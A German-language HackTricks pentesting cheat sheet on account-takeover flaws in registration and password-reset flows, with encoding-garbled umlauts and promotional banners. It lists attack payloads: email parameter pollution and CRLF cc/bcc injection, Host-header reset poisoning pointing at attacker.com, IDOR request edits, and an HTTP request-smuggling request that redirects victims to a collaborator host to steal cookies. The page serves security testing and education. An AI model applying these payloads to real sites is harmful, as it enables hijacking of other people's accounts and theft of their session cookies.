# Registrierungs- & √úbernahmeschwachstellen

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** m√∂chten oder **HackTricks im PDF-Format herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware**n **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe aufgrund von informationsstehlender Malware zu bek√§mpfen.

Sie k√∂nnen ihre Website besuchen und ihr Tool **kostenlos** ausprobieren unter:

{% embed url="https://whiteintel.io" %}

---

## Registrierungs√ºbernahme

### Duplikatregistrierung

* Versuchen Sie, mit einem vorhandenen Benutzernamen zu generieren
* √úberpr√ºfen Sie die Variation der E-Mail:
  * Gro√übuchstaben
  * \+1@
  * f√ºgen Sie einige Punkte in die E-Mail ein
  * Sonderzeichen im E-Mail-Namen (%00, %09, %20)
  * Setzen Sie schwarze Zeichen nach der E-Mail: `test@test.com a`
  * victim@gmail.com@attacker.com
  * victim@attacker.com@gmail.com

### Benutzername Aufz√§hlung

√úberpr√ºfen Sie, ob Sie herausfinden k√∂nnen, ob ein Benutzername bereits in der Anwendung registriert wurde.

### Passwortrichtlinie

Beim Erstellen eines Benutzers √ºberpr√ºfen Sie die Passwortrichtlinie (√ºberpr√ºfen Sie, ob Sie schwache Passw√∂rter verwenden k√∂nnen).\
In diesem Fall k√∂nnen Sie versuchen, Anmeldeinformationen per Bruteforce zu ermitteln.

### SQL-Injection

[**√úberpr√ºfen Sie diese Seite**](sql-injection/#insert-statement), um zu lernen, wie Sie Konto√ºbernahmen versuchen oder Informationen √ºber **SQL-Injections** in Registrierungsformularen extrahieren k√∂nnen.

### Oauth-√úbernahmen

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAML-Schwachstellen

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### E-Mail-√Ñnderung

Versuchen Sie nach der Registrierung, die E-Mail zu √§ndern, und √ºberpr√ºfen Sie, ob diese √Ñnderung korrekt validiert wird oder ob Sie sie in beliebige E-Mails √§ndern k√∂nnen.

### Weitere √úberpr√ºfungen

* √úberpr√ºfen Sie, ob Sie **Wegwerf-E-Mails** verwenden k√∂nnen
* **Langes** **Passwort** (>200) f√ºhrt zu **DoS**
* **√úberpr√ºfen Sie die Rate Limits bei der Kontenerstellung**
* Verwenden Sie username@**burp\_collab**.net und analysieren Sie den **R√ºckruf**

## **Passwortzur√ºcksetzungs√ºbernahme**

### Passwortzur√ºcksetzungstoken-Leak √ºber Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Fordern Sie das Zur√ºcksetzen des Passworts an Ihre E-Mail-Adresse an
2. Klicken Sie auf den Link zum Zur√ºcksetzen des Passworts
3. √Ñndern Sie das Passwort nicht
4. Klicken Sie auf beliebige Websites von Drittanbietern (z. B. Facebook, Twitter)
5. Unterbrechen Sie die Anfrage im Burp Suite-Proxy
6. √úberpr√ºfen Sie, ob der Referrer-Header das Passwortzur√ºcksetzungstoken preisgibt.

### Passwortzur√ºcksetzung-Vergiftung <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Unterbrechen Sie die Passwortzur√ºcksetzungsanfrage in Burp Suite
2. F√ºgen Sie die folgenden Header in Burp Suite hinzu oder bearbeiten Sie sie: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Leiten Sie die Anfrage mit dem ge√§nderten Header weiter\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Suchen Sie nach einer Passwortzur√ºcksetzungs-URL basierend auf dem _Host-Header_ wie: `https://attacker.com/reset-password.php?token=TOKEN`

### Passwortzur√ºcksetzung √ºber E-Mail-Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR auf API-Parametern <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Der Angreifer muss sich mit seinem Konto anmelden und die Funktion **Passwort √§ndern** aufrufen.
2. Starten Sie Burp Suite und unterbrechen Sie die Anfrage.
3. Senden Sie sie an den Repeater-Tab und bearbeiten Sie die Parameter: Benutzer-ID/E-Mail\
`powershell POST /api/changepass [...] ("form": {"email":"opfer@email.com","password":"sicherespwd"})`

### Schwacher Passwort-Reset-Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Der Passwort-Reset-Token sollte jedes Mal zuf√§llig generiert und einzigartig sein.\
Versuchen Sie festzustellen, ob der Token abl√§uft oder ob er immer derselbe ist. In einigen F√§llen ist der Generierungsalgorithmus schwach und kann erraten werden. Die folgenden Variablen k√∂nnten vom Algorithmus verwendet werden.

* Zeitstempel
* Benutzer-ID
* E-Mail des Benutzers
* Vor- und Nachname
* Geburtsdatum
* Kryptografie
* Nur Zahlen
* Kleine Token-Sequenz (Zeichen zwischen \[A-Z,a-z,0-9])
* Token-Wiederverwendung
* Ablaufdatum des Tokens

### Durchsickern des Passwort-Reset-Tokens <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. L√∂sen Sie eine Anforderung zum Zur√ºcksetzen des Passworts √ºber die API/UI f√ºr eine bestimmte E-Mail aus, z.B.: test@mail.com
2. √úberpr√ºfen Sie die Serverantwort und suchen Sie nach `resetToken`
3. Verwenden Sie dann den Token in einer URL wie `https://beispiel.com/v3/benutzer/passwort/zur√ºcksetzen?resetToken=[DER_RESET_TOKEN]&email=[DIE_MAIL]`

### Passwort zur√ºcksetzen √ºber Benutzername-Kollision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registrieren Sie sich im System mit einem Benutzernamen, der dem Benutzernamen des Opfers entspricht, jedoch mit Leerzeichen vor und/oder nach dem Benutzernamen eingef√ºgt. z.B.: `"admin "`
2. Fordern Sie ein Passwort-Reset mit Ihrem b√∂sartigen Benutzernamen an.
3. Verwenden Sie den an Ihre E-Mail gesendeten Token und setzen Sie das Passwort des Opfers zur√ºck.
4. Melden Sie sich mit dem neuen Passwort im Opferkonto an.

Die Plattform CTFd war anf√§llig f√ºr diesen Angriff.\
Siehe: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Konto√ºbernahme √ºber Cross-Site-Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Finden Sie ein XSS innerhalb der Anwendung oder eines Subdomains, wenn die Cookies auf die √ºbergeordnete Domain beschr√§nkt sind: `*.domain.com`
2. Leaken Sie das aktuelle **Sitzungscookie**
3. Authentifizieren Sie sich als Benutzer mithilfe des Cookies

### Konto√ºbernahme √ºber HTTP-Request-Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Verwenden Sie **smuggler**, um den Typ des HTTP-Request-Smugglings (CL, TE, CL.TE) zu erkennen\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Erstellen Sie eine Anfrage, die das `POST / HTTP/1.1` mit den folgenden Daten √ºberschreibt:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` mit dem Ziel, die Opfer auf burpcollab umzuleiten und ihre Cookies zu stehlen\
3\. Die endg√ºltige Anfrage k√∂nnte wie folgt aussehen
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
### Hackerone-Berichte zur Ausnutzung dieses Fehlers\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Konto√ºbernahme √ºber CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Erstellen Sie ein Payload f√ºr CSRF, z.B. "HTML-Formular mit automatischem Absenden f√ºr eine Passwort√§nderung"
2. Senden Sie den Payload

### Konto√ºbernahme √ºber JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token kann verwendet werden, um einen Benutzer zu authentifizieren.

* Bearbeiten Sie das JWT mit einer anderen Benutzer-ID / E-Mail
* √úberpr√ºfen Sie die schwache JWT-Signatur

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Referenzen

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)


## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware** **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe aufgrund von informationsstehlender Malware zu bek√§mpfen.

Sie k√∂nnen ihre Website besuchen und ihr Tool **kostenlos** ausprobieren unter:

{% embed url="https://whiteintel.io" %}


<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** m√∂chten oder **HackTricks im PDF-Format herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
